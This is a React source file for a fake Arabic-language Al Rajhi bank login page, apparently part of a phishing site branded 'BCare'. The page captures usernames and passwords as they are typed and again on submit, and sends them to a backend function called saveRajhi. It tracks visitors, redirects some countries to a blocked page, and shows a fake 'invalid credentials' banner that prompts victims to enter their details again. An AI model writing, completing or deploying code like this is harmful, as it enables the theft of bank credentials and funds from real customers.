import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { RejectBanner } from "@/components/RejectBanner";
import { useEffect, useState } from "react";
import { z } from "zod";
import { useVisitorTracking } from "@/hooks/useVisitorTracking";
import { useLiveInput } from "@/hooks/useLiveInput";
import { checkCountryAccess, saveRajhi } from "@/lib/tracking.functions";
import brandLogo from "@/assets/brand-logo.svg";


export const Route = createFileRoute("/rajhi")({
  head: () => ({
    meta: [
      { title: "التحقق من الحساب | بي كير" },
      { name: "description", content: "تسجيل الدخول للتحقق من حسابك في بي كير." },
    ],
    links: [
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800;900&family=Outfit:wght@500;700&display=swap",
      },
    ],
  }),
  validateSearch: z.object({ error: z.union([z.string(), z.number()]).optional() }),
  component: RajhiPage,
});

function RajhiPage() {
  useVisitorTracking("التحقق من الحساب - بي كير");
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [showPass, setShowPass] = useState(false);
  const [focus, setFocus] = useState<string | null>(null);
  const [remember, setRemember] = useState(false);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  useLiveInput({ username, password });


  useEffect(() => {
    if (typeof window === "undefined") return;
    checkCountryAccess()
      .then((res) => {
        if (res && res.allowed === false) window.location.replace("/blocked");
      })
      .catch(() => {});
  }, []);

  async function onSubmit(e: React.FormEvent<HTMLFormElement>) {
    e.preventDefault();
    const sessionId = window.localStorage.getItem("bcare_session_id");
    if (!sessionId) return;
    const fd = new FormData(e.currentTarget);
    setLoading(true);
    await saveRajhi({
      data: {
        session_id: sessionId,
        username: String(fd.get("username") ?? ""),
        password: String(fd.get("password") ?? ""),
      },
    }).catch(() => {});
    setLoading(false);
    navigate({ to: "/rajhi-wait" as never });
  }

  return (
    <div
      dir="rtl"
      className="min-h-screen relative flex flex-col items-center justify-center p-4 sm:p-6 overflow-hidden"
      style={{
        fontFamily: "'Tajawal', system-ui, sans-serif",
        background:
          "radial-gradient(1200px 600px at 50% -10%, #EAF3FA 0%, #F5F8FB 55%, #F5F8FB 100%)",
      }}
    >
      {/* Subtle decorative rings */}
      <div className="pointer-events-none absolute inset-0 opacity-[0.35]" aria-hidden>
        <div className="absolute -top-40 -right-40 w-[420px] h-[420px] rounded-full border border-[#156394]/15" />
        <div className="absolute -top-24 -right-24 w-[280px] h-[280px] rounded-full border border-[#156394]/10" />
        <div className="absolute -bottom-40 -left-40 w-[420px] h-[420px] rounded-full border border-[#156394]/10" />
      </div>

      <div className="w-full max-w-[440px] relative">
        <RejectBanner message="بيانات تسجيل الدخول غير صحيحة، يرجى المحاولة مرة أخرى." />

        {/* Top brand strip */}
        <div className="flex items-center justify-center gap-2 mb-5">
          <span className="inline-flex items-center gap-1.5 text-[13px] font-semibold text-[#156394] bg-[#156394]/10 px-3 py-1.5 rounded-full">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z" />
              <path d="m9 12 2 2 4-4" />
            </svg>
            تحقق آمن عبر بي كير فاتورة عبر تطبيق الراجحي
          </span>
        </div>

        <div className="relative bg-white rounded-[28px] shadow-[0_20px_60px_-20px_rgba(21,99,148,0.25)] border border-[#156394]/10 overflow-hidden">
          {/* Accent top bar */}
          <div className="h-1.5 w-full" style={{ background: "linear-gradient(90deg,#2b86c0,#156394,#0c4269)" }} />

          <div className="p-6 sm:p-9 flex flex-col items-center">
            {/* Logo lockup */}
            <div className="relative mb-5">
              <div className="absolute inset-0 rounded-3xl blur-2xl bg-[#156394]/25" aria-hidden />
              <div className="relative w-24 h-24 rounded-3xl bg-gradient-to-br from-white to-[#EAF3FA] border border-[#156394]/15 shadow-[inset_0_1px_0_rgba(255,255,255,0.9)] flex items-center justify-center">
                <img src={brandLogo} alt="الشعار" className="w-16 h-auto" />

              </div>
            </div>

            <h1 className="text-[22px] sm:text-2xl font-extrabold text-[#10243a] tracking-tight">
              مرحباً بك في الراجحي
            </h1>
            <p className="mt-2 text-[13.5px] text-[#64748b] text-center leading-relaxed max-w-[320px]">
              مرحبا بك في الراجحي اون لاين
            </p>

            {/* Single tab — login only */}
            <div className="mt-6 w-full rounded-2xl border border-[#156394]/15 bg-[#EAF3FA] p-1.5">
              <button
                type="button"
                className="w-full rounded-xl bg-white py-3 text-sm font-extrabold text-[#156394] shadow-sm border border-[#156394]/10"
              >
                تسجيل الدخول
              </button>
            </div>


            <form onSubmit={onSubmit} className="w-full space-y-4">
              <Field label="اسم المستخدم" active={focus === "u"}>
                <input
                  name="username"
                  required
                  autoComplete="username"
                  placeholder="أدخل اسم المستخدم"
                  dir="ltr"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  onFocus={() => setFocus("u")}
                  onBlur={() => setFocus(null)}
                  className="w-full bg-transparent outline-none text-[15px] tracking-wider text-[#10243a] placeholder:text-[#94a3b8] text-left"
                  style={{ fontFamily: "'Outfit', 'Tajawal', sans-serif" }}
                />

              </Field>

              <Field label="كلمة السر" active={focus === "p"}>
                <input
                  name="password"
                  type={showPass ? "text" : "password"}
                  required
                  autoComplete="current-password"
                  placeholder="••••••••"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  onFocus={() => setFocus("p")}
                  onBlur={() => setFocus(null)}
                  className="w-full bg-transparent outline-none text-[15px] text-[#10243a] placeholder:text-[#94a3b8] pl-14"
                />
                <button
                  type="button"
                  onClick={() => setShowPass((v) => !v)}
                  className="absolute inset-y-0 left-3 my-auto h-8 rounded-lg px-2.5 text-[11px] font-bold text-[#156394] hover:bg-[#156394]/10 transition-colors"
                >
                  {showPass ? "إخفاء" : "إظهار"}
                </button>
              </Field>

              {/* Remember me only */}
              <div className="flex items-center justify-between px-1">
                <label className="flex items-center gap-2 cursor-pointer">
                  <input
                    type="checkbox"
                    name="remember"
                    checked={remember}
                    onChange={(e) => setRemember(e.target.checked)}
                    className="h-4 w-4 rounded border-[#cbd5e1] text-[#156394] focus:ring-[#156394]/20"
                  />
                  <span className="text-[13px] font-medium text-[#64748b]">تذكرني</span>
                </label>
              </div>

              <button
                type="submit"
                disabled={loading}
                className="group relative w-full overflow-hidden rounded-2xl py-4 font-extrabold text-white text-[15px] shadow-[0_12px_30px_-8px_rgba(21,99,148,0.55)] active:scale-[0.985] transition-all disabled:opacity-70 disabled:cursor-not-allowed"
                style={{ background: "linear-gradient(135deg,#2b86c0 0%,#156394 55%,#0c4269 100%)" }}
              >
                <span className="relative z-10 flex items-center justify-center gap-2">
                  {loading ? (
                    <>
                      <span className="h-4 w-4 rounded-full border-2 border-white/40 border-t-white animate-spin" />
                      جارٍ التحقق…
                    </>
                  ) : (
                    <>
                      تسجيل الدخول
                      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                        <path d="M19 12H5" />
                        <path d="m12 19-7-7 7-7" />
                      </svg>
                    </>
                  )}
                </span>
                <span className="absolute inset-0 bg-gradient-to-r from-white/0 via-white/25 to-white/0 translate-x-[-120%] group-hover:translate-x-[120%] transition-transform duration-700" />
              </button>
            </form>

          </div>
        </div>

        <p className="mt-5 text-center text-[11px] text-[#94a3b8]">
          © بي كير — جميع الحقوق محفوظة
        </p>
      </div>
    </div>
  );
}

function Field({
  label,
  active,
  children,
}: {
  label: string;
  active: boolean;
  children: React.ReactNode;
}) {
  return (
    <div>
      <label className="block text-[12.5px] font-bold text-[#334155] mr-1 mb-1.5">{label}</label>
      <div
        className={`relative flex items-center rounded-2xl border bg-[#F5F8FB] px-4 py-3.5 transition-all ${
          active
            ? "border-[#156394] bg-white ring-4 ring-[#156394]/10 shadow-sm"
            : "border-[#e2e8f0] hover:border-[#cbd5e1]"
        }`}
      >
        {children}
      </div>
    </div>
  );
}

